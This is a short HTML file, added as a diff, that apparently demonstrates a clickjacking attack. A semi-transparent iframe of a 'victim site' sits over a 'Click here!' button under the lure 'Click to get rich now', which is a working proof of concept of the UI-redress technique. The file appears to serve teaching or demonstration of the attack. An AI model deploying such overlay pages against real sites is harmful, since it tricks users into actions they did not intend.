@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>ClickJacking</title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+  </head>
+  <body>
+    <h1>ClickJacking</h1>
+    
+  <style>
+    iframe {
+      width: 400px;
+      height: 100px;
+      position: absolute;
+      top: 64px;
+      left: 13px;
+      opacity: 0.5;
+      z-index: 1;
+    }
+  </style>
+
+  <div>Click to get rich now:</div>
+
+  <!-- The url from the victim site -->
+  <iframe src="clickjackingd"></iframe>
+
+  <button>Click here!</button>
+
+  <div>...And you're cool (I'm a cool hacker actually)!</div>
+  
+
+  </body>
+</html>
